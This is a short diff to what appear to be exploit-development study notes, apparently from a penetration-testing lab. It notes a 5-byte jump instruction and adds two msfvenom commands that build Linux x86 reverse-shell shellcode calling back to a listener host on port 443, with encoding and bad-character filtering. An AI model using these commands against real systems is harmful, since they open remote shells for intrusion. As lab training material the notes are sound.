@@ -16,3 +16,10 @@ nasm >
 ```
 
 The instructions '\x83\xc0\x0c\xff\xe0` take up only 5 bytes of memory.
+
+`msfvenom` payload is now for Linux:  
+`msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.125 LPORT=443 -f raw –e x86/shikata_ga_nai -b "\x0a\x0d\x20" > exploit.txt`
+
+OR with just a couple of badchars from the example, neat way of putting out the raw code though:  
+
+`msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -b "\x00\x20" -f py -v shellcode`
